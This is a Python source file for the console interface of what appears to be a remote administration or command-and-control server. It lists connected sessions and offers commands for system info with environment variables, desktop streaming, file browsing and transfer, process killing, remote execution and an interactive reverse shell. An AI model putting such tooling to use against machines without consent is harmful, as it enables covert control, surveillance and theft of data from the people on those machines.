import os
import signal
import sys

from readerwriterlock import rwlock

from shared.net_lib.packets.packet import PacketShell
from server.ui.console.views.filesystem_view import FileSystemView
from server.ui.console.views.main_view import MainView
from server.ui.console.views.process_view import ProcessView


class ConsoleUiMediator:
    def __init__(self, application):
        self.running = False

        self.application = application

        self.current_view = None

        self.fs_view = FileSystemView(self)
        self.main_view = MainView(self)
        self.ps_view = ProcessView(self)

        self.interacting = False
        self.waiting_desktop_images = False
        self.shell_active = False

        self.client_id = None
        self.client_lock = rwlock.RWLockRead()

    def start_async(self):
        self.running = True
        self.current_view = self.main_view

    def main_loop(self):
        self.running = True
        self.setup_ctrl_handler()

        while self.running:
            line = self.current_view.loop()

            if line is None:
                pass

            if line == 'quit':
                self.running = False
                # Try to handle the instruction

            if not self.process_instruction(line):
                # If we could not handle it, forward it to app
                if not self.handle_instruction(line.lower()):
                    pass

    def process_instruction(self, instruction):
        if instruction:
            parts = instruction.split(' ')

            if not self.interacting:
                if parts[0] == 'help':
                    print("Commands:")
                    print("ls - List available sessions")
                    return True

                if instruction.startswith('interact'):
                    if len(parts) == 2:
                        self.interacting = True
                        self.client_id = int(parts[1])
                        self.current_view.client_id = self.client_id
                        return True

            else:
                if parts[0] == 'help':
                    print("Commands:")
                    print("sysinfo - Retrieves the client system information")
                    print("rdesktop start - Starts a Remote Desktop Streaming session")
                    print("ls [path] - retrieves the list of files, if path is empty, then retrieves roots")
                    print("ps - Retrieves the list processes running on the client system")
                    print("download path - Downloads a file from the given url "
                          "and saves it into path(temp by default)")
                    print("upload path - Upload a file from this system to the client")
                    print("exec [path] - Executes a file in the remote system, "
                          "if path is empty starts new reverse shell")
                    print("shell - Starts a new reverse shell session")

                    print(self.current_view.get_name())
                    self.current_view.print_help(prefix='\t')

                    return True

                elif parts[0] == 'fs' and (len(parts) == 1 or (len(parts) > 1 and parts[1] == 'start')):
                    self.current_view = self.fs_view
                    self.fs_view.client_id = self.client_id
                    return True
        return False

    def handle_instruction(self, instruction):
        if instruction:
            parts = instruction.split(' ')
            lock = self.client_lock.gen_rlock()
            try:
                if lock.acquire(blocking=True, timeout=5):
                    if self.interacting:
                        # If reverse shell active forward everything to the remote shell
                        if self.shell_active:
                            self.application.send_shell_command(self.client_id, instruction)
                            return True

                        if instruction == 'sysinfo':
                            self.application.get_client_info(self.current_view.client_id)
                        elif instruction == 'rdesktop start':
                            self.application.start_desktop_session(self.current_view.client_id)
                            self.waiting_desktop_images = True
                        elif instruction == 'rdesktop stop':
                            self.application.stop_desktop_session(self.client_id)
                            self.waiting_desktop_images = False

                        elif parts[0] == 'ls':
                            path = None
                            if len(parts) > 1:
                                path = ' '.join(parts[1:])

                            if self.interacting:
                                # If we are in FileSystem View append path to current directory
                                if self.current_view == self.fs_view:
                                    path = self.fs_view.join_path(path)
                                    self.application.request_fs_entries(self.current_view.client_id, path)
                                else:
                                    self.application.request_fs_entries(self.current_view.client_id, path)
                            else:
                                self.list_connections()

                        elif parts[0] == 'fs':
                            if len(parts) == 1:
                                raise AssertionError("Expected more than one argument")

                        elif parts[0] == 'download':
                            if len(parts) < 1:
                                return False

                            path = parts[1]
                            if self.current_view == self.fs_view:
                                path = self.fs_view.join_path(path)

                            self.application.download_file(self.current_view.client_id, path)

                        elif parts[0] == 'upload':
                            if len(parts) > 1:
                                path = parts[1]
                                self.application.upload(self.current_view.client_id, path)

                        elif parts[0] == 'ps':
                            self.application.get_process_list(self.current_view.client_id)

                        elif parts[0] == 'pskill':
                            if len(parts) > 1:
                                pid = int(parts[1])
                                self.application.kill_process(self.current_view.client_id, pid)

                        # Execute command, don't pipe the process
                        elif parts[0] == 'exec':
                            if len(parts) > 1:
                                command = ' '.join(parts[1:])
                                self.application.exec(self.current_view.client_id, command)

                        # Execute command, pipe the process
                        elif parts[0] == 'pexec':
                            if len(parts) > 1:
                                command = ' '.join(parts[1:])
                                self.application.exec_piped(self.current_view.client_id, command)

                        elif parts[0] == 'shell':
                            self.application.get_reverse_shell(self.current_view.client_id)
                            self.shell_active = True

                    elif instruction == 'ls' or instruction == 'list sessions':
                        self.list_connections()
                else:
                    print('Error on acquiring lock')
            except:
                pass
            finally:
                lock.release()

        return None

    def interact(self, client_id):
        w_lock = self.client_lock.gen_wlock()
        if w_lock.acquire(blocking=True, timeout=5):
            self.interacting = True
            self.client_id = client_id
            self.main_view.client_id = client_id
            w_lock.release()
        else:
            print('Error locking writer lock, timed out 5 seconds')

    def setup_ctrl_handler(self):
        def ctrl_handler():
            if self.interacting and self.waiting_desktop_images:
                self.application.stop_desktop_session(self.client_id)

        signal.signal(signal.SIGINT, ctrl_handler)

    def on_client_disconnected(self, client):
        print('Client disconnected ', client)
        r_lock = self.client_lock.gen_rlock()
        if r_lock.acquire(blocking=True, timeout=5):
            if client['client_id'] == self.client_id:
                r_lock.release()

                w_lock = self.client_lock.gen_wlock()
                if w_lock.acquire(blocking=True, timeout=5):
                    self.current_view = self.main_view
                    self.client_id = None
                    self.main_view.client_id = None
                    self.interacting = False

                    w_lock.release()

                    print("\nClient disconnected, back to home view")
                    self.main_view.print_banner()

    def on_new_client(self, client):
        sys.stdout.write('New Connection\n\tClient Id: %s\n\tPcName: %s'
                         '\n\tOperating System: %s'
                         '\n\tUsername: %s\n'
                         % (client['client_id'], client['pc_name'], client['os_name'], client['username']))

        # To speed up manual testing, the first connection gets interaction
        self.interact(client['client_id'])
        self.current_view.print_banner()

    def client_info_received(self, client, info):
        env = info['env']
        py_version = info['py_version']
        arch = info['arch']

        print('\n============================================')
        print('User Information for %s\n' % client['pc_name'])
        print('============================================')
        print('\tPython version: %s' % py_version)
        print('\tArchitecture: %s' % arch)
        print('\tEnvironment variables')

        if env is not None:
            for key in env.keys():
                print('\t\t%s: %s' % (key, env[key]))

        self.current_view.print_banner()

    def on_fs_data_received(self, client, packet):
        if packet.success:
            if packet.path is None:
                self.fs_view.print_fs_roots(client, packet.list_dir)
            else:
                self.fs_view.print_client_ls(client, packet.path, packet.list_dir)
        else:
            self.current_view.print_error_message(packet.error_message)

        self.current_view.print_banner()

    def on_desktop_data_received(self, client, image):
        client_id = client['client_id']
        pc_name = client['pc_name']
        folder_name = '%s_%s' % (client_id, pc_name)
        dir_path = 'downloads/streaming/%s/desktop/' % folder_name
        if not os.path.exists(dir_path):
            os.makedirs(dir_path)
        image.save('downloads/streaming/%s/desktop/image.png' % folder_name)

    def on_process_list_received(self, client, processes):
        ProcessView.print_process_list(client=client, processes=processes)
        self.current_view.print_banner()

    def on_process_killed(self, result):
        if not result.success:
            self.current_view.print_error_message(getattr(result, 'error_message', 'Unknown error'))
        self.current_view.print_banner()

    def packet_shell_received(self, client, packet):
        if packet.shell_action == PacketShell.Actions.Interactive:
            # self.current_view = self.ps_view
            self.ps_view.print_shell_data(packet.data)

        elif packet.shell_action == PacketShell.Actions.ExecPiped:
            ProcessView.print_shell_data(packet.data)
        elif packet.shell_action == PacketShell.Actions.Stop:
            self.shell_active = False
            self.show_error_message(client, 'Shell Exited, error message: %s' % packet.data)
            self.current_view.print_banner()

    def list_connections(self):
        clients = self.application.list_connections()
        # this corresponds to list sessions or ls in MainView

        print('\n===================================================')
        print('Available sessions(%s)' % len(clients))
        print('===================================================')
        for client in clients:
            print('Client(%s):\n\tPc name: %s\n\tOperating System: %s\n\tUsername: %s\n'
                  % (client['client_id'], client['pc_name'], client['os_name'],
                     client['username']))
        self.current_view.print_banner()

    def show_success_message(self, client, message):
        if client is not None and type(client) == dict:
            print('%s' % client.get('pc_name'))
        if type(message) == list:
            for msg in message:
                print(msg)
        else:
            print(message)

    def show_error_message(self, client, error):
        if client is not None and type(client) == dict:
            print('Error from user %s' % client.get('pc_name'))
        if type(error) == list:
            for err in error:
                print(err)
        else:
            print(error)
